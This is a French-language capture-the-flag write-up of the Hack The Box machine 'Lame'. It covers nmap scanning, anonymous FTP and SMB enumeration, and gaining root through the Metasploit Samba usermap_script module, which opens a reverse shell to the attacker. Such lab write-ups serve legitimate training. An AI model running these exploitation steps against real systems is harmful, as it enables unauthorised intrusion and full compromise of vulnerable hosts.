---
tags:
  - htb
  - metasploit
  - smb
  - ftp
title: Lame
os: Linux
difficulty: Easy
date: 2025-11-15
status: terminé
draft: "false"
---
---
# Lame

> [!summary] Résumé rapide  
> Machine facile avec un service Samba qui tourne sous une version obsolète, facilement exploitable et qui donne un accès en root directement.

---

## 🟦 Informations générales

- **Nom de la machine :** Lame
- **OS :** Linux
- **Difficulty :** Easy
- **Auteur :** ch4p
- **Date :** 15/11/2025
- **Statut :** Terminée

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.57.230 --min-rate 5000
```

**Services découverts :**
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 15:17 CET
Nmap scan report for 10.129.57.230
Host is up (0.092s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds
```

> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p21,22,139,445,3632 10.129.57.230
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 15:18 CET                    Nmap scan report for 10.129.57.230                                                 
Host is up (0.021s latency).                                                       

PORT     STATE SERVICE     VERSION                                                                                            
21/tcp   open  ftp         vsftpd 2.3.4                                       
| ftp-syst:                
|   STAT:                                  
| FTP server status:                                      
|      Connected to 10.10.14.66                                      
|      Logged in as ftp                      
|      TYPE: ASCII                    
|      No session bandwidth limit           
|      Session timeout in seconds is 300                     
|      Control connection is plain text                  
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-11-15T09:19:28-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m37s, deviation: 3h32m11s, median: 34s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.60 seconds
```

---
## 🟦 2. Analyse des services

### 📁 FTP
**Infos :**  Login anonymous autorisé - Version : vsftpd 2.3.4
**Enumerations :**

Connexion et listing des fichiers sur le serveur FTP :

```bash
ftp anonymous@lame.htb
```

```bash
Connected to lame.htb.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||31920|).
150 Here comes the directory listing.
226 Directory send OK.
```

> [!info] Outils utilisés  
- ftp

**Fichiers / données récupérées :** Aucun fichier dans le ftp

---

### 📁 SMB / FTP / Autres services
**Infos :**  Login anonyme autorisé - Version Samba smbd 3.0.20-Debian
**Enumerations :**

Connexion et listing des shares :
```bash
smbclient -L //lame.htb
```

```bash
Password for [WORKGROUP\shep]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------
        
        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

On a accès au share tmp mais aucun fichier ne semble intéressant :
```bash
smbclient //lame.htb/tmp
```

```bash
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 15 15:38:32 2025
  ..                                 DR        0  Sat Oct 31 08:33:58 2020
  .ICE-unix                          DH        0  Sat Nov 15 15:15:15 2025
  vmware-root                        DR        0  Sat Nov 15 15:15:51 2025
  .X11-unix                          DH        0  Sat Nov 15 15:15:40 2025
  5683.jsvc_up                        R        0  Sat Nov 15 15:16:24 2025
  .X0-lock                           HR       11  Sat Nov 15 15:15:40 2025
  vgauthsvclog.txt.0                  R     1600  Sat Nov 15 15:15:13 2025
  
                7282168 blocks of size 1024. 5385896 blocks available
```

Les sous-dossiers sont soit inaccessibles soit ne contiennent pas d'information intéressantes

> [!info] Outils utilisés  
- smbclient

**Fichiers / données récupérées :** vgauthsvclog.txt.0 : fichier de logs du service vgauth de vmware

---

## 🟦 3. Points d’entrée potentiels
-  Le service SMB semble être dans une version vulnérable :
```bash
searchsploit samba 3.0.20-Debian
```

![[Pasted image 20251115154559.png]]

-  Le service FTP semble être dans une version avec une backdoor :
```bash
searchsploit vsftpd 2.3.4
```

![[Pasted image 20251115160600.png]]

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

On va utiliser `msfconsole` (Metasploit) afin d'exploiter la cible.

```bash
msf > search samba 3.0.20
msf > use exploit/multi/samba/usermap_script
```

Configuration de l'exploit : (`options` pour voir les options)
```bash
msf exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => 10.10.14.66
msf exploit(multi/samba/usermap_script) > set RHOST lame.htb
RHOST => lame.htb
```

**Résultat :**  
```bash
msf exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.14.66:4444 
[*] Command shell session 1 opened (10.10.14.66:4444 -> 10.129.57.230:45908) at 2025-11-15 15:51:42 +0100
```

![[Pasted image 20251115155259.png]]

**Accès obtenu :**  
- User :  root
- Contexte :  shell

---

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Recherche de vulnérabilités
-  Utilisation de Metasploit

> [!attention] Patterns utiles  
- Enumération des versions de services 
- Vérification des vulnérabilités en ligne + `searchsploit`